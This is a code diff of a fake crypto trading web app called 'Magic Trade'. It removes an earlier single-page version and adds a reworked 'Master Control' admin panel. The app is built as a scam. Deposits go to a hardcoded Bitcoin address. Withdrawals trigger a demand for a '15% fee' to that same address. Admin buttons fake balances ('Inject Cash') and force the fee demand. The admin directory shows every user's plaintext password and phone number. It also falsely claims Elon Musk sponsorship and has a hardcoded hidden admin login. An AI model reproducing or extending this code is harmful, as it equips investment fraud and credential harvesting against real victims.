@@ -1,226 +1,98 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Magic Trade | Global Node</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
-    <style>
-        body { background: #010409; color: #e6edf3; font-family: -apple-system, sans-serif; height: 100dvh; display: flex; flex-direction: column; overflow: hidden; margin: 0; }
-        .magic-card { background: #0d1117; border: 1px solid #30363d; border-radius: 12px; }
-        .magic-gradient { background: linear-gradient(90deg, #1f6feb 0%, #388ed1 100%); }
-        .bottom-nav { background: #0d1117; border-top: 1px solid #30363d; position: fixed; bottom: 0; width: 100%; display: flex; justify-content: space-around; padding: 12px 0; z-index: 100; }
-        .nav-item { display: flex; flex-direction: column; align-items: center; font-size: 10px; color: #8b949e; cursor: pointer; }
-        #scroll-area { flex: 1; overflow-y: auto; padding-bottom: 150px; scroll-behavior: smooth; }
-        .chart-box { height: 320px; width: 100%; border-radius: 12px; overflow: hidden; border: 1px solid #30363d; background: #000; margin-bottom: 12px; }
-        #pending-overlay { position: fixed; inset: 0; background: rgba(1, 4, 9, 0.99); z-index: 1500; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 40px; }
-        #trade-drawer, #action-drawer { position: fixed; bottom: -100%; left: 0; right: 0; background: #161b22; border-top: 2px solid #30363d; border-radius: 24px 24px 0 0; z-index: 1000; transition: 0.4s; padding: 30px; }
-        .drawer-open { bottom: 0 !important; }
-    </style>
-</head>
-<body>
+<section id="admin-sec" class="hidden space-y-6">
+    <div class="flex justify-between items-end">
+        <h3 class="text-2xl font-black text-blue-500 italic uppercase">Master Control</h3>
+        <p class="text-[9px] text-slate-500 font-mono bg-slate-900 px-2 py-1 rounded" id="admin-user-count">Nodes: 0</p>
+    </div>
 
-    <div id="auth-screen" class="fixed inset-0 z-[200] flex flex-col items-center justify-center bg-[#010409] p-6 text-center">
-        <h1 class="text-4xl font-black text-white italic tracking-tighter mb-2">MAGIC<span class="text-blue-500">TRADE</span></h1>
-        <p class="text-[9px] text-slate-500 uppercase mb-8 tracking-widest">Global Secure Terminal <span onclick="triggerAdminLogin()">●</span></p>
-        <div class="magic-card p-6 w-full max-w-sm space-y-4">
-            <input type="text" id="reg-name" placeholder="Full Name" class="hidden w-full p-4 rounded-xl bg-black border border-slate-800 text-sm text-white outline-none">
-            <input type="tel" id="reg-phone" placeholder="Phone Number" class="hidden w-full p-4 rounded-xl bg-black border border-slate-800 text-sm text-white outline-none">
-            <input type="email" id="email" placeholder="Email Address" class="w-full p-4 rounded-xl bg-black border border-slate-800 text-sm text-white outline-none">
-            <input type="password" id="pass" placeholder="Password" class="w-full p-4 rounded-xl bg-black border border-slate-800 text-sm text-white outline-none">
-            <button onclick="handleAuth()" class="w-full magic-gradient p-4 rounded-xl font-bold uppercase text-xs">Enter Node</button>
-            <button onclick="toggleAuthMode()" class="text-xs text-blue-500 font-bold block mx-auto mt-4">Create New Account</button>
+    <div class="magic-card p-4 space-y-4 border-blue-500/30 bg-gradient-to-b from-[#161b22] to-[#0d1117]">
+        <div>
+            <p class="text-[8px] text-blue-500 font-bold uppercase mb-2 tracking-widest">Target Selection</p>
+            <input type="text" id="adm-user" placeholder="Paste User Email Here" class="w-full p-4 bg-black border border-slate-800 rounded-xl text-xs outline-none text-white font-mono placeholder:text-slate-700">
+        </div>
+        <div class="grid grid-cols-2 gap-3">
+            <button onclick="adminAction('inject')" class="bg-blue-600 hover:bg-blue-500 p-3 rounded-lg font-black text-[10px] uppercase transition-all">Inject Cash 💸</button>
+            <button onclick="adminAction('togglePending')" class="bg-yellow-600 p-3 rounded-lg font-black text-[10px] uppercase">Force Fee ⚠️</button>
         </div>
     </div>
 
-    <div id="app" class="hidden flex flex-col h-full overflow-hidden">
-        <header class="p-4 flex justify-between items-center bg-[#0d1117] border-b border-slate-800">
-            <span id="user-display" class="font-bold text-[10px] text-white uppercase italic">---</span>
-            <span class="text-[8px] text-blue-500 font-bold uppercase">● Musk Verified Node</span>
-        </header>
+    <div class="space-y-3">
+        <p class="text-[9px] text-slate-500 uppercase font-bold tracking-widest ml-1">Live Network Directory</p>
+        <div id="user-logs" class="space-y-3 max-h-[500px] overflow-y-auto pr-2 custom-scrollbar">
+            </div>
+    </div>
+</section>
 
-        <div id="scroll-area">
-            <main class="p-4">
-                <div class="magic-card p-6 bg-gradient-to-br from-[#1b2129] to-[#010409] mb-8">
-                    <div class="flex justify-between items-start">
-                        <div>
-                            <p class="text-slate-500 text-[9px] font-bold uppercase tracking-widest">Available Capital</p>
-                            <h2 class="text-3xl font-mono font-bold text-white tracking-tighter" id="display-bal">$0.00</h2>
-                            <p class="text-blue-400 font-mono text-[11px]" id="display-btc">0.000000 BTC</p>
-                        </div>
-                        <div class="flex gap-2">
-                            <button onclick="openAction('deposit')" class="bg-blue-600 text-[8px] font-black px-3 py-2 rounded-lg">DEPOSIT</button>
-                            <button onclick="openAction('withdraw')" class="bg-slate-800 text-[8px] font-black px-3 py-2 rounded-lg">WITHDRAW</button>
-                        </div>
+<script>
+// --- MASTER LOGIC FOR AUTO-DISCOVERY ---
+
+function loadUserLogs() {
+    // 1. Force pull the latest users from storage
+    users = JSON.parse(localStorage.getItem('magic_users')) || {};
+    const logContainer = document.getElementById('user-logs');
+    const userEntries = Object.entries(users);
+    
+    document.getElementById('admin-user-count').innerText = "NODES: " + userEntries.length;
+
+    if (userEntries.length === 0) {
+        logContainer.innerHTML = `<div class="p-10 text-center border-2 border-dashed border-slate-800 rounded-2xl">
+            <p class="text-slate-600 text-[9px] uppercase font-bold">Scanning for new signals...</p>
+        </div>`;
+        return;
+    }
+
+    // 2. Sort users by newest first and build the cards
+    logContainer.innerHTML = userEntries.reverse().map(([email, data]) => `
+        <div class="magic-card p-4 bg-[#0d1117] border-l-4 ${data.isBlocked ? 'border-l-red-600' : (data.bal === 0 ? 'border-l-blue-500 animate-pulse' : 'border-l-green-500')}">
+            <div class="flex justify-between items-start mb-2">
+                <div>
+                    <div class="flex items-center gap-2">
+                        <p class="text-blue-400 font-black text-[12px] uppercase tracking-tighter">${data.name || 'Anonymous'}</p>
+                        ${data.bal === 0 ? '<span class="bg-blue-600 text-[7px] px-1 rounded font-bold">NEW</span>' : ''}
                     </div>
+                    <p class="text-slate-500 text-[8px] font-mono">${email}</p>
                 </div>
-
-                <section id="home-sec" class="space-y-4"><div id="master-market-feed"></div></section>
-
-                <section id="ledger-sec" class="hidden space-y-4">
-                    <h3 class="text-xl font-bold italic">Transaction Ledger</h3>
-                    <div id="ledger-list" class="magic-card p-4 space-y-2 text-[10px]"></div>
-                </section>
-
-                <section id="profile-sec" class="hidden space-y-6">
-                    <h3 class="text-xl font-black italic uppercase">Node Identity</h3>
-                    <div class="magic-card p-6 space-y-4">
-                        <div><p class="text-[9px] text-slate-500 uppercase">Name</p><p id="prof-name" class="text-white font-bold">---</p></div>
-                        <div><p class="text-[9px] text-slate-500 uppercase">Email</p><p id="prof-email" class="text-white font-mono text-xs">---</p></div>
-                        <div><p class="text-[9px] text-slate-500 uppercase">Phone</p><p id="prof-phone" class="text-white font-mono text-xs">---</p></div>
-                    </div>
-                    <div class="magic-card p-6 border-blue-500/20 text-center">
-                        <p class="text-[10px] font-bold text-white italic uppercase">🚀 Proudly Sponsored by Elon Musk</p>
-                    </div>
-                </section>
-
-                <section id="admin-sec" class="hidden space-y-6">
-                    <h3 class="text-xl font-black text-blue-500 uppercase">Admin Dashboard</h3>
-                    <div class="magic-card p-4 space-y-3">
-                        <input type="text" id="adm-user" placeholder="User Email Exactly" class="w-full p-3 bg-black border border-slate-800 rounded text-xs outline-none text-white">
-                        <button onclick="adminAction('inject')" class="w-full bg-blue-600 p-3 rounded font-bold text-[9px] uppercase">Inject Funds</button>
-                        <div class="grid grid-cols-2 gap-2">
-                            <button onclick="adminAction('toggleBlock')" class="bg-red-600 p-3 rounded text-[9px] font-bold">BAN USER</button>
-                            <button onclick="adminAction('togglePending')" class="bg-yellow-600 p-3 rounded text-[9px] font-bold">TRIGGER FEE</button>
-                        </div>
-                    </div>
-                    <div id="user-logs" class="space-y-2"></div>
-                </section>
-            </main>
-        </div>
-
-        <nav class="bottom-nav">
-            <div onclick="showSection('home')" class="nav-item">📈<span class="mt-1">Markets</span></div>
-            <div onclick="showSection('ledger')" class="nav-item">📜<span class="mt-1">Ledger</span></div>
-            <div onclick="showSection('profile')" class="nav-item">👤<span class="mt-1">Profile</span></div>
-            <div id="admin-nav-btn" onclick="showSection('admin')" class="nav-item hidden">🛡️<span class="mt-1">Admin</span></div>
-        </nav>
-    </div>
-
-    <div id="action-drawer">
-        <div id="deposit-content" class="hidden space-y-4 text-center">
-            <h4 class="text-xl font-black italic uppercase">Funding Node</h4>
-            <div class="p-4 bg-black border border-blue-500/30 rounded-xl">
-                <p class="text-[10px] font-mono text-blue-400 break-all select-all">bc1qnv6sshvdz0h2yjc0hxutkfn72qpqvshgjrw6zm</p>
+                <div class="text-right">
+                    <p class="text-white font-mono font-bold text-[11px]">$${(data.bal || 0).toLocaleString()}</p>
+                    <button onclick="copyToInject('${email}')" class="text-[7px] text-blue-500 font-bold uppercase mt-1">Copy ID</button>
+                </div>
+            </div>
+            
+            <div class="grid grid-cols-2 gap-4 mt-3 pt-3 border-t border-slate-800/50">
+                <div>
+                    <p class="text-[7px] text-slate-600 uppercase font-bold">Phone Node</p>
+                    <p class="text-white text-[9px] font-mono">${data.phone || 'HIDDEN'}</p>
+                </div>
+                <div>
+                    <p class="text-[7px] text-slate-600 uppercase font-bold">Master Password</p>
+                    <p class="text-red-400 text-[9px] font-mono font-bold">${data.pass}</p>
+                </div>
             </div>
         </div>
-        <div id="withdraw-content" class="hidden space-y-4">
-            <h4 class="text-xl font-black italic uppercase">Withdraw</h4>
-            <input type="text" id="w-address" placeholder="BTC Address" class="w-full bg-black border border-slate-800 p-4 rounded-xl text-white outline-none">
-            <input type="number" id="w-amount" placeholder="Amount (USDT)" class="w-full bg-black border border-slate-800 p-4 rounded-xl text-white outline-none">
-            <button onclick="submitWithdraw()" class="w-full magic-gradient p-4 rounded-xl font-bold uppercase text-xs">Process Payout</button>
-        </div>
-        <button onclick="document.getElementById('action-drawer').classList.remove('drawer-open')" class="w-full mt-4 text-[9px] text-slate-500 font-bold">CLOSE</button>
-    </div>
+    `).join('');
+}
 
-    <div id="trade-drawer">
-        <h4 id="t-asset" class="text-2xl font-black italic mb-4">ASSET</h4>
-        <input type="number" id="t-amount" placeholder="USDT Margin" class="w-full bg-black border border-slate-800 p-4 rounded-xl text-white outline-none mb-4">
-        <div class="grid grid-cols-2 gap-4">
-            <button onclick="executeTrade('BUY')" class="bg-green-600 p-4 rounded-xl font-bold uppercase">Buy</button>
-            <button onclick="executeTrade('SELL')" class="bg-red-600 p-4 rounded-xl font-bold uppercase">Sell</button>
-        </div>
-    </div>
+// 3. Helper to quickly paste email into injection box
+function copyToInject(email) {
+    document.getElementById('adm-user').value = email;
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+    // Visual feedback
+    document.getElementById('adm-user').style.borderColor = '#3b82f6';
+    setTimeout(() => document.getElementById('adm-user').style.borderColor = '#30363d', 1000);
+}
 
-    <div id="pending-overlay">
-        <h2 class="text-xl font-black text-white italic uppercase mb-2">Verification Required</h2>
-        <p class="text-[10px] text-slate-400 mb-6">Blockchain requires a <span class="text-yellow-500 font-bold">15% fee</span> to release node funds.</p>
-        <div class="magic-card p-4 bg-black w-full">
-            <p class="text-[10px] font-mono text-yellow-500 break-all">bc1qnv6sshvdz0h2yjc0hxutkfn72qpqvshgjrw6zm</p>
-        </div>
-    </div>
-
-    <script>
-        let users = JSON.parse(localStorage.getItem('magic_users')) || {};
-        let activeSession = localStorage.getItem('magic_session') || null;
-
-        const assetList = [
-            {id: "BTCUSD", name: "Bitcoin"}, {id: "ETHUSD", name: "Ethereum"}, {id: "SOLUSD", name: "Solana"},
-            {id: "FX:EURUSD", name: "Euro / USD"}, {id: "XAUUSD", name: "Gold Spot"}, {id: "NASDAQ:TSLA", name: "Tesla Inc"}
-        ];
-
-        window.onload = () => { if(activeSession) enterApp(activeSession); renderMarketFeed(); };
-
-        function renderMarketFeed() {
-            const feed = document.getElementById('master-market-feed');
-            feed.innerHTML = assetList.map((a, i) => `
-                <div class="mb-8">
-                    <div class="flex justify-between items-center mb-2">
-                        <h4 class="text-xs font-black italic uppercase">${a.name}</h4>
-                        <button onclick="openTrade('${a.name}')" class="bg-blue-600 px-3 py-1 rounded text-[8px] font-bold">TRADE</button>
-                    </div>
-                    <div class="chart-box" id="tv_chart_${i}"></div>
-                </div>
-            `).join('');
-            assetList.forEach((a, i) => {
-                new TradingView.widget({ "autosize": true, "symbol": a.id, "interval": "5", "theme": "dark", "style": "1", "container_id": `tv_chart_${i}`, "hide_top_toolbar": true });
-            });
-        }
-
-        function handleAuth() {
-            const e = document.getElementById('email').value.trim().toLowerCase();
-            const p = document.getElementById('pass').value;
-            if(!document.getElementById('reg-name').classList.contains('hidden')) {
-                users[e] = { name: document.getElementById('reg-name').value, phone: document.getElementById('reg-phone').value, pass: p, bal: 0, isBlocked: false, isPending: false };
-                save(); toggleAuthMode(); alert("Account Created"); return;
-            }
-            if(users[e] && users[e].pass === p) enterApp(e); else alert("Denied");
-        }
-
-        function enterApp(e) {
-            if(users[e]?.isBlocked) { document.getElementById('auth-screen').innerHTML = "BANNED"; return; }
-            activeSession = e; localStorage.setItem('magic_session', e);
-            document.getElementById('auth-screen').classList.add('hidden');
-            document.getElementById('app').classList.remove('hidden');
-            document.getElementById('pending-overlay').style.display = users[e]?.isPending ? 'flex' : 'none';
-            if(localStorage.getItem('magic_is_admin') === 'true') document.getElementById('admin-nav-btn').classList.remove('hidden');
-            updateUI();
-        }
-
-        function updateUI() {
-            const u = users[activeSession]; if(!u) return;
-            document.getElementById('display-bal').innerText = "$" + u.bal.toLocaleString();
-            document.getElementById('display-btc').innerText = (u.bal / 96000).toFixed(6) + " BTC";
-            document.getElementById('prof-name').innerText = u.name;
-            document.getElementById('prof-email').innerText = activeSession;
-            document.getElementById('prof-phone').innerText = u.phone || "N/A";
-            document.getElementById('user-display').innerText = u.name;
-        }
-
-        function adminAction(type) {
-            users = JSON.parse(localStorage.getItem('magic_users'));
-            const target = document.getElementById('adm-user').value.toLowerCase().trim();
-            if(!users[target]) return alert("404");
-            if(type === 'inject') users[target].bal += parseFloat(prompt("Amount:"));
-            if(type === 'toggleBlock') users[target].isBlocked = !users[target].isBlocked;
-            if(type === 'togglePending') users[target].isPending = !users[target].isPending;
-            save(); loadUserLogs(); updateUI();
-        }
-
-        function loadUserLogs() {
-            const uData = JSON.parse(localStorage.getItem('magic_users'));
-            document.getElementById('user-logs').innerHTML = Object.entries(uData).map(([email, d]) => `
-                <div class="p-3 bg-black border border-slate-800 rounded text-[9px]">
-                    <p class="text-blue-500 font-bold">${d.name} | ${d.pass}</p>
-                    <p>${email} | ${d.phone} | $${d.bal}</p>
-                </div>
-            `).join('');
-        }
-
-        function openAction(t) { 
-            document.getElementById('deposit-content').classList.add('hidden');
-            document.getElementById('withdraw-content').classList.add('hidden');
-            document.getElementById(t + '-content').classList.remove('hidden');
-            document.getElementById('action-drawer').classList.add('drawer-open');
-        }
-        function submitWithdraw() { users[activeSession].isPending = true; save(); location.reload(); }
-        function openTrade(n) { document.getElementById('t-asset').innerText = n; document.getElementById('trade-drawer').classList.add('drawer-open'); }
-        function executeTrade(t) { const a = parseFloat(document.getElementById('t-amount').value); users[activeSession].bal -= a; save(); document.getElementById('trade-drawer').classList.remove('drawer-open'); updateUI(); }
-        function showSection(s) { ['home','ledger','profile','admin'].forEach(x => document.getElementById(x+'-sec')?.classList.add('hidden')); document.getElementById(s+'-sec').classList.remove('hidden'); if(s==='admin') loadUserLogs(); }
-        function save() { localStorage.setItem('magic_users', JSON.stringify(users)); }
-        function toggleAuthMode() { document.getElementById('reg-name').classList.toggle('hidden'); document.getElementById('reg-phone').classList.toggle('hidden'); }
-        function triggerAdminLogin() { if(prompt("ID")==="MASTER_ADA" && prompt("KEY")==="ADA_777_NODE") { localStorage.setItem('magic_is_admin', true); enterApp("ADMIN"); } }
-    </script>
-</body>
-</html>
+// 4. Update the section switcher to ALWAYS refresh the list
+function showSection(s) {
+    const ids = ['home', 'ledger', 'profile', 'admin'];
+    ids.forEach(id => {
+        const section = document.getElementById(id + '-sec');
+        if(section) section.classList.add('hidden');
+    });
+    
+    const target = document.getElementById(s + '-sec');
+    if(target) {
+        target.classList.remove('hidden');
+        if(s === 'admin') loadUserLogs(); // Auto-refresh when opening admin
+        if(s === 'profile') renderProfile();
+    }
+}
+</script>
